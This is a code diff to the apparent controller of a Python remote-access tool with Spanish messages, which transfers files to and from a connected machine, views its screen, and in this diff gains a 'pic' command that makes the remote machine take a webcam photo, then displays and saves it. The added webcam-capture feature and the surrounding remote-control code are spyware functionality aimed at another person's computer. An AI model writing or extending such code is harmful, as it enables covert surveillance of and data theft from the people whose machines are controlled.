@@ -31,6 +31,7 @@ class TCP:
 
         sleep(0.05)
         self.initDir = os.getcwd()
+        self.pics = 0
         self.comandos = deque()
         info = self.__conexion.recv(1024).decode()
         info = info.split('\n')
@@ -164,10 +165,10 @@ class TCP:
                 res = 'S'
             else:
                 if peso > 0:
-                    print(Fore.MAGENTA + f"\n[?] {index}. Subir \"{nombre}\" ({paquetes})?...\n[S/n] ", end='')
+                    print(Fore.MAGENTA + f"\n[?] {index}/{tam}. Subir \"{nombre}\" ({paquetes})?...\n[S/n] ", end='')
                     res = input()
                 else:
-                    print(Fore.YELLOW + f"\n[!] {index}. Archivo \"{nombre}\" omitido ({nombre}, {paquetes})")
+                    print(Fore.YELLOW + f"\n[!] {index}/{tam}. Archivo \"{nombre}\" omitido ({nombre}, {paquetes})")
                     res = 'N'
 
             sleep(0.05)
@@ -214,10 +215,10 @@ class TCP:
                 res = 'S'
             else:
                 if peso > 0:
-                    print(Fore.MAGENTA + f"\n[?] {index}. Bajar \"{nombre}\" (-p{paquetes}, -s{peso})?...\n[S/n] ", end='')
+                    print(Fore.MAGENTA + f"\n[?] {index}/{tam}. Bajar \"{nombre}\" (-p{paquetes}, -s{peso})?...\n[S/n] ", end='')
                     res = input()
                 else:
-                    print(Fore.YELLOW + f"\n[!] {index}. Archivo \"{nombre}\" omitido (-p{paquetes}, -s{peso})")
+                    print(Fore.YELLOW + f"\n[!] {index}/{tam}. Archivo \"{nombre}\" omitido (-p{paquetes}, -s{peso})")
                     res = 'N'
 
             if len(res) == 0 or res.upper() == 'S':
@@ -374,6 +375,36 @@ class TCP:
             cv2.waitKey()
             cv2.destroyAllWindows()
 
+        else:
+            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")
+
+    def pic(self, cmd):
+        self.__conexion.send(cmd.encode())
+
+        msg = self.__conexion.recv(1024).decode()
+        if msg[:6] != "error:":
+            info = self.recibirDatos()
+
+            matriz = numpy.frombuffer(info, dtype=numpy.uint8)
+            imagen = cv2.imdecode(matriz, -1)
+
+            height, width = imagen.shape[:2]
+            escala = self.escalar(height, width)
+            imagen = cv2.resize(imagen, None, fx=escala, fy=escala)
+
+            print(f"Escala: {escala}")
+            cv2.imshow(f"{self.__userName}@{self.__addr[0]}: Foto", imagen)
+            cv2.waitKey()
+            cv2.destroyAllWindows()
+
+            if re.search("-s", cmd):
+                if not os.path.isdir(f"{self.initDir}/pics"):
+                    os.mkdir(f"{self.initDir}/pics")
+                fotoRuta = f"{self.initDir}/pics/pic{self.pics}.jpg"
+                cv2.imwrite(fotoRuta, imagen)
+                print(Fore.GREEN + f"[+] Foto \"{fotoRuta}\" guardada")
+                self.pics += 1
+        
         else:
             print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")
 
@@ -623,6 +654,17 @@ class TCP:
 
                     except:
                         print(Fore.RED + "[-] Error de proceso (img)")
+
+                elif cmd.lower()[:3] == "pic":
+                    try:
+                        if re.search("-c[= ]", cmd):
+                            self.pic(cmd)
+                        
+                        else:
+                            print(Fore.YELLOW + "[!] Falta del parametro camara (-c)")
+                    
+                    except:
+                        print(Fore.RED + "Error de proceso (pic)")
 
                 elif cmd.lower()[:3] == "sdf":
                     try:
